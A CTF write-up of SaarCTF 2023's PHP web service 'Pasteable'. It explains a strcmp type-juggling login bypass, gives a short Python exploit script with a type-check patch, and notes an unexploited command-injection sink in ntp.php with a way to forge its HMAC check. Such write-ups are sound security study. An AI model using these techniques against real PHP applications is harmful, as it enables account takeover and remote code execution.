---
date: '2023-11-19T12:00:00Z'
draft: false
title: 'SaarCTF2023 - Pasteable'
summary: "This challenge was part of the attack/defense SaarCTF of 2023. This is a web challenge written in PHP, where a wrong use of \"==\" led to a type juggling vulnerability."

categories: 
    - writeups
tags: 
    - "attack-defense"
    - "web"
    - "php"
    - "type confusion"
author: "bhackari"
---

## Service description

**Pasteable** is a website, written in PHP, which allows a user to register, login and then create some "pastes" inside a Mysql database. This pastes get encrypted by the backend with a key provided by the user. The last feature of this website allows users to view the stored pastes and decrypt them with the appropriate keys.

---
## What's our goal?

The `attack.json` file provided by the SaarCTF organizers contained a list of usernames for this challenge, so we are probably supposed to login as that user and read the flag from the pastes list.
Once this was clear we started to check how the login was handled: a user is logged in when `authenticated` is set to `yes` inside the `$_SESSION` array.
So our goal is to set `$_SESSION["authenticated"]` to `yes`.

```php
// forward the good bois
if(isset($_SESSION["authenticated"]) && $_SESSION["authenticated"] === "yes") {
	header('Location: /admin/home');
	exit();
}
```

---
## How can we log in?

Analysing the source code we can see that there are 2 places where the backend does what we want: in `/func/register.php` and in `/func/login.php`.
We can see that the first file can’t do anything for us, because it only allows to set “authenticated” to “yes” for a newly created user.
The second one, tho, allows us to login with any username, so let’s take a look on how this works.

```php
<?php

session_start();
require("config.php");

// include challenge functions
include('./lib/challenge.php');

if(!isset($_POST['username']) || !isset($_POST['solution'])){
	header('HTTP/1.0 403 Forbidden');
	die("Invalid request");
}

if(!isset($_SESSION['challenge']) || !(strcmp($_POST['solution'], $_SESSION['challenge']) == 0)){
	header('HTTP/1.0 403 Forbidden');
	die("No valid challenge found");
}

destroyChallenge();
$username = $_POST['username'];
$stmt = $MYSQLI->prepare("SELECT user_id FROM user_accounts WHERE user_name = ? LIMIT 1"); 

if (
	$stmt &&
	$stmt -> bind_param('s', $username) &&
	$stmt -> execute() &&
	$stmt -> store_result() &&
	$stmt -> bind_result($userid) &&
	$stmt -> fetch()
) {
	// user exists
	$_SESSION['last_login'] = date("Y-m-d H:i:s", time());
	$_SESSION['id'] = $userid;
	$_SESSION['name'] = $username;
	// set new state
	$_SESSION['authenticated'] = "yes";
} else {
	// wrong data!
	$_SESSION['last_login'] = date("Y-m-d H:i:s", time());
	header('HTTP/1.0 403 Forbidden');
}
```

We can see that `authenticated` is set to `yes` only if the SQL query made previously is successful.
**What does that query do?** It selects the `user_id` of the user with the username that we send to the page when we make the request.
Our goal is for that query to be executed with our username, the problem is that are 2 if statements that prevent us from doing so:
- the first checks if we sent both `"username"` and `"solution"` fields in our http request, and if not it gives us a `403 invalid request` error.
- then the second checks if `"challenge"` is set inside the `$_SESSION` array and checks if the solution we sent is equal to what is inside `$_SESSION` at the index `"challenge"`, if one of those conditions is false it gives us a `403 No valid challenge found`error.

**But what are those `"challenge"` and `"solution"`?** 
We can see that the page includes the following file: `/lib/challenge.php`. This file has 2 functions:

```php
<?php
  
/**
* Generates a new challenge
*
* @return string
*/
function generateChallenge() {
	mt_srand(time());
	
	$strength = 6;
	$alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$l = strlen($alpha);
	$random_string = '';
	for($i = 0; $i < $strength; $i++) {
		$random_character = $alpha[mt_rand(0, $l - 1)];
		$random_string .= $random_character;
	}
	
	$_SESSION['challenge'] = $random_string;
	return $random_string;
}

/**
* Destroys challenge
*/
function destroyChallenge() {
	unset($_SESSION['challenge']);
}
```

The first one creates a `"challenge"`, which is set inside the `$_SESSION` array as a string of 6 random
chars taken from the following alphabet `“ABCDEFGHIJKLMNOPQRSTUVWXYZ”`, and the second one
destroys it.
We can see that the first function is getting called inside `/func/challenge.php` file and the
second one inside `/func/login.php` file.
So basically we have to send a POST request to `/func/challenge.php` (with the username as a
parameter) in order to set inside the `$_SESSION` array the `"challenge"`. After that, we have to send another POST request to `login.php` with two parameters: `“username”` and `“solution”`, where `“solution”`must be equal to the challenge that was generated before.
The brute-force approach is not the best solution because having an alphabet of 26 chars, and a string of 6 chars, we would have to try `308.915.776` times to be sure to find the correct `"challenge"`, this is obviously impractical, so we must find another approach.

---
## strcmp() vuln and type juggling

In the `login.php` page we analysed almost everything, the only thing remaining is the `strcmp() function`, just by googling and opening the PHP documentation, we can read this:

>`If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.   For instance you may get an unexpected 0, or return values of NULL, -2, 2, 3 and -3.`

So basically we can make this function return NULL thanks to PHP comparison problems with `“==”`. NULL is equal to 0: this vuln is called **type juggling**.

**But how can we make it return NULL?** 
Reading the documentation we find out that if a parameter is an array `strcmp` returns NULL.

>`strcmp("foo", array()) => NULL + PHP Warning   strcmp("foo", new stdClass) => NULL + PHP Warning   strcmp(function(){}, "") => NULL + PHP Warning`

In conclusion our attack is composed like this:
1. POST request to `/func/challenge.php` with one parameter: `"username"`, this sets the `"challenge"` inside the `$_SESSION` array.
2. POST request to `/func/login.php` with two parameters: `"username"` and the `"solution"` (array), setting `"authenticated"` inside the `$_SESSION` array.
3. GET request to `/admin/home/index.php` in order to print the paste with the flag.

---

## Exploit:

Our exploit takes a command line argument: the IP of an enemy team, and takes from the `attack.json` file the username that it will use to log in.

```python
#!/usr/bin/env python3

import random
import string
import sys
import requests
import json
from pwn import *
from Crypto.Hash import SHA256
import sys

def get_flag_ids(team_id, service_name):
	url = "https://scoreboard.ctf.saarland/attack.json"
	try:
		response = requests.get(url)
		response.raise_for_status()
		data = response.json()
		if "flag_ids" in data and service_name in data["flag_ids"]: 
			if team_id in [team["id"] for team in data["teams"]]:
				for team in data["teams"]:
					if team["id"] == team_id:
						team_ip = next(team["ip"])
				return data["flag_ids"][service_name].get(team_ip, {})
		else:
			print("Invalid team_id or service_name")
	except requests.exceptions.RequestException as e:
		print(f"Error: {e}")

def get_data(team_id, service_name, flag_id):
	url = "https://scoreboard.ctf.saarland/attack.json"
	try:
		response = requests.get(url)
		response.raise_for_status()
		data = response.json()
		for team in data["teams"]:
			if team["id"] == team_id:
				team_ip = next(team["ip"]) 
		return data["flag_ids"][service_name][team_ip][flag_id]
	except requests.exceptions.RequestException as e:
		print(f"Error: {e}")

host = sys.argv[1]
team = (int(host.split(".")[1])-32)*200 + int(host.split(".")[2])
print("I need to attack the team {} with host: {}".format(team,host))
service = 'Pasteable'
  
for id in get_flag_ids(team,service):
	username = get_data(team, service, id)
	s = requests.Session() 
	
	res = s.post(f"http://{host}:8080/func/challenge.php", 
				data={"username":username})
	res = s.post(f"http://{host}:8080/func/login.php", 
				data={"username":username, "solution[]":b""})
	res = s.get(f"http://{host}:8080/admin/")
	
	print(res.text, flush=True)
```

---

## Patch

To patch this vuln we have 2 options:
1. Check the type of the `“solution”` parameter and allow only string values.
2. Check the `"solution"` parameter in another way, instead of using the `strcmp()` function.

We decided to patch the service using the first option, and used the `gettype()` function to verify if `"solution"` was indeed a string.

```php
if(
	!isset($_POST['username']) || 
	!isset($_POST['solution']) || 
	gettype($_POST["solution"])!="string"
){ 
	header('HTTP/1.0 403 Forbidden'); 
	die("Invalid request"); 
}
```

---

## P.S:

We also found a potential RCE in the `/func/ntp.php` file, but we didn't concentrate much on that because we had already a very efficient exploit running. Also the team was very short of players so we focused more on exploiting the other services.

Just for completeness, this is the potentially vulnerable code:

```php
// Network-Time-Protocol API

// variables and configs
require("../func/config.php");

// ensure that requester knows super-duper-secret
$additional_time_formatter = (isset($_GET['modifiers'])) ? $_GET['modifiers'] : "";
$caller_nonce = (isset($_GET['nonce'])) ? $_GET['nonce'] : "";
$caller_checksum = (isset($_GET['checksum'])) ? $_GET['checksum'] : "";

if(isset($_GET['modifiers'])) {
    $nonce_hash = hash_hmac('sha256', $caller_nonce, $APP_SECRET);
    $checksum = hash_hmac('sha256', $additional_time_formatter, $nonce_hash);

    // if the checksum is wrong, the requester is a bad guy who
    // doesn't know the secret
    if($checksum !== $caller_checksum) {
        die("ERROR: Checksum comparison has failed!");
    }
}
// print current time
$time_command = ($APP_HOST === 'win') ? "date /t && time /t" : "date";
$requested_time = `$time_command $additional_time_formatter`;
echo preg_replace('~[\r\n]+~', '', $requested_time);
```

This `ntp.php` file uses OS commands to get the timestamp. The vulnerability is that a user-controlled parameter is appended to the command, this is exploitable and enables RCE on the backend.
The only complication is the hmac checksum verification, but this can be bypassed because:
1. The `$APP_SECRET` is hardcoded and reused.
2. We have control over the `"nonce"` and the `"checksum"` parameters.
So, if we forge `"checksum"` and `"nonce"` based on our`"modifiers"` (which contains our code injection payload), we should achieve the RCE we've longed for.